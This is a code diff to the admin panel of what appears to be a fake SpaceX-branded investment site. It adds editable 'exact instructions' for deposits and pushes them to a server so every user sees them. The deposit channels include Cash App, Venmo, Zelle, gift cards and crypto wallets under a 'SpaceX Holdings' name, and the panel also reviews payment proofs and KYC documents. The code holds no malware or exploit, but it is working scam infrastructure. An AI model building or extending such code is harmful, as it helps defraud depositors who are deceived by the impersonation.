@@ -813,6 +813,7 @@
         )
           me = db.users[i];
       var adminToken = localStorage.getItem("authToken");
+      var serverPayLoaded = false;
       var API_BASE = window.SPACEX_CONFIG.apiBase;
       function escapeHtml(value) {
         return String(value == null ? "" : value).replace(
@@ -1372,7 +1373,7 @@
         db = get();
         var html = "";
         db.users.forEach(function (u) {
-          if (!u.planUpgrade) return;
+          if (u.planUpgrade !== "pending") return;
           var st = u.planUpgrade;
           var pill =
             st === "accepted" ? "on-p" : st === "pending" ? "wait" : "off-p";
@@ -1851,10 +1852,7 @@
       async function reviewServerKyc(documentId, status) {
         var rejectionReason =
           status === "REJECTED"
-            ? window.prompt(
-                "Rejection reason:",
-                "Document declined by admin.",
-              )
+            ? window.prompt("Rejection reason:", "Document declined by admin.")
             : null;
         if (status === "REJECTED" && !rejectionReason) return;
         try {
@@ -1877,15 +1875,26 @@
       async function reviewTransaction(transactionId, status) {
         var reason =
           status === "REJECTED"
-            ? window.prompt("Rejection reason:", "Payment could not be verified.")
+            ? window.prompt(
+                "Rejection reason:",
+                "Payment could not be verified.",
+              )
             : null;
         if (status === "REJECTED" && !reason) return;
         try {
-          await adminApi("/api/admin/transactions/" + encodeURIComponent(transactionId) + "/review", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ status: status, rejectionReason: reason || undefined }),
-          });
+          await adminApi(
+            "/api/admin/transactions/" +
+              encodeURIComponent(transactionId) +
+              "/review",
+            {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                status: status,
+                rejectionReason: reason || undefined,
+              }),
+            },
+          );
           drawTx();
         } catch (error) {
           window.alert(error.message);
@@ -1920,9 +1929,12 @@
                 var metadata = t.metadata || {};
                 var method = metadata.method || "";
                 var proof = metadata.proof || "";
-                var proofMarkup = String(proof).indexOf("data:image") === 0
-                  ? '<img src="' + escapeHtml(proof) + '" alt="Payment proof" style="height:42px;border-radius:6px;cursor:pointer;" class="tx-proof">'
-                  : escapeHtml(metadata.proofName || "");
+                var proofMarkup =
+                  String(proof).indexOf("data:image") === 0
+                    ? '<img src="' +
+                      escapeHtml(proof) +
+                      '" alt="Payment proof" style="height:42px;border-radius:6px;cursor:pointer;" class="tx-proof">'
+                    : escapeHtml(metadata.proofName || "");
                 html +=
                   '<tr style="border-bottom:1px solid #1a1a1a;">' +
                   '<td style="padding:10px 5px;"><input type="checkbox" class="tx-checkbox" data-id="' +
@@ -1940,8 +1952,16 @@
                   "</span></td>" +
                   '<td style="padding:10px;">' +
                   escapeHtml(t.type) +
-                  (method ? '<br><span class="muted" style="font-size:11px;">' + escapeHtml(method) + "</span>" : "") +
-                  (proofMarkup ? '<br><span class="muted" style="font-size:11px;">' + proofMarkup + "</span>" : "") +
+                  (method
+                    ? '<br><span class="muted" style="font-size:11px;">' +
+                      escapeHtml(method) +
+                      "</span>"
+                    : "") +
+                  (proofMarkup
+                    ? '<br><span class="muted" style="font-size:11px;">' +
+                      proofMarkup +
+                      "</span>"
+                    : "") +
                   "</td>" +
                   '<td style="padding:10px;font-weight:700;' +
                   (t.amount < 0 ? "color:#f87171" : "color:#4ade80") +
@@ -2077,26 +2097,31 @@
             accountNumber: "***********4829",
             routing: "021000021",
             memo: "SPX-DEP-0826",
+            instructions: "",
           },
           cashapp: {
             accountName: "SpaceX Holdings",
             tag: "$SpaceXOfficial",
             memo: "SPX-DEP-0826",
+            instructions: "",
           },
           zelle: {
             accountName: "SpaceX Holdings LLC",
             email: "payments@spacex.com",
             memo: "SPX-DEP-0826",
+            instructions: "",
           },
           venmo: {
             accountName: "SpaceX Holdings",
             username: "@SpaceX-Official",
             memo: "SPX-DEP-0826",
+            instructions: "",
           },
           paypal: {
             accountName: "SpaceX Holdings LLC",
             email: "payments@spacex.com",
             memo: "SPX-DEP-0826",
+            instructions: "",
           },
           moneygram: {
             fullName: "SpaceX Holdings LLC",
@@ -2104,6 +2129,7 @@
             address: "1 Rocket Road, Hawthorne, CA 90250",
             phone: "+1 (310) 363-6000",
             memo: "SPX-DEP-0826",
+            instructions: "",
           },
           crypto: {
             memo: "SPX-DEP-0826",
@@ -2114,11 +2140,28 @@
             bnb: "",
             xrp: "",
             ada: "",
+            instructions: "",
           },
-          gift: { memo: "SPX-DEP-0826" },
+          gift: { memo: "SPX-DEP-0826", instructions: "" },
         };
       }
       function drawPay() {
+        if (adminToken && !serverPayLoaded) {
+          adminApi("/api/payment-instructions")
+            .then(function (payload) {
+              db = get();
+              db.pay = payload.pay || {};
+              save(db);
+              serverPayLoaded = true;
+              drawPay();
+            })
+            .catch(function (error) {
+              console.warn("Unable to load shared payment instructions", error);
+              serverPayLoaded = true;
+              drawPay();
+            });
+          return;
+        }
         db = get();
         var dft = payDefaults();
         db.pay = db.pay || {};
@@ -2161,26 +2204,31 @@
           accountNumber: "Account number",
           routing: "Routing",
           memo: "Reference",
+          instructions: "Exact instructions",
         });
         fields("Cash App", "cashapp", {
           accountName: "Account name",
           tag: "Cash App tag",
           memo: "Reference",
+          instructions: "Exact instructions",
         });
         fields("Zelle", "zelle", {
           accountName: "Account name",
           email: "Zelle email / phone",
           memo: "Reference",
+          instructions: "Exact instructions",
         });
         fields("Venmo", "venmo", {
           accountName: "Account name",
           username: "Venmo username",
           memo: "Reference",
+          instructions: "Exact instructions",
         });
         fields("PayPal", "paypal", {
           accountName: "Account name",
           email: "PayPal email",
           memo: "Reference",
+          instructions: "Exact instructions",
         });
         fields("MoneyGram", "moneygram", {
           fullName: "Full name",
@@ -2188,6 +2236,7 @@
           address: "Address",
           phone: "Phone",
           memo: "Reference",
+          instructions: "Exact instructions",
         });
         fields("Crypto wallets", "crypto", {
           btc: "BTC",
@@ -2198,6 +2247,11 @@
           xrp: "XRP",
           ada: "ADA",
           memo: "Reference",
+          instructions: "Exact instructions",
+        });
+        fields("Gift Card", "gift", {
+          memo: "Reference",
+          instructions: "Exact instructions",
         });
         html +=
           "<div class='btns'><button class='primary' id='b-pay'>Save pay details</button></div>";
@@ -2218,17 +2272,19 @@
             "accountNumber",
             "routing",
             "memo",
+            "instructions",
           ]);
-          grab("cashapp", ["accountName", "tag", "memo"]);
-          grab("zelle", ["accountName", "email", "memo"]);
-          grab("venmo", ["accountName", "username", "memo"]);
-          grab("paypal", ["accountName", "email", "memo"]);
+          grab("cashapp", ["accountName", "tag", "memo", "instructions"]);
+          grab("zelle", ["accountName", "email", "memo", "instructions"]);
+          grab("venmo", ["accountName", "username", "memo", "instructions"]);
+          grab("paypal", ["accountName", "email", "memo", "instructions"]);
           grab("moneygram", [
             "fullName",
             "country",
             "address",
             "phone",
             "memo",
+            "instructions",
           ]);
           grab("crypto", [
             "btc",
@@ -2239,8 +2295,30 @@
             "xrp",
             "ada",
             "memo",
+            "instructions",
           ]);
+          grab("gift", ["memo", "instructions"]);
           save(db);
+          if (adminToken) {
+            adminApi("/api/admin/payment-instructions", {
+              method: "PUT",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ pay: db.pay }),
+            })
+              .then(function (payload) {
+                db = get();
+                db.pay = payload.pay || db.pay;
+                save(db);
+                alert("Saved. Each user will see these payment details.");
+              })
+              .catch(function (error) {
+                alert(
+                  "Saved locally, but the shared settings could not be updated: " +
+                    error.message,
+                );
+              });
+            return;
+          }
           alert("Saved. Each method page will show this.");
         };
       }
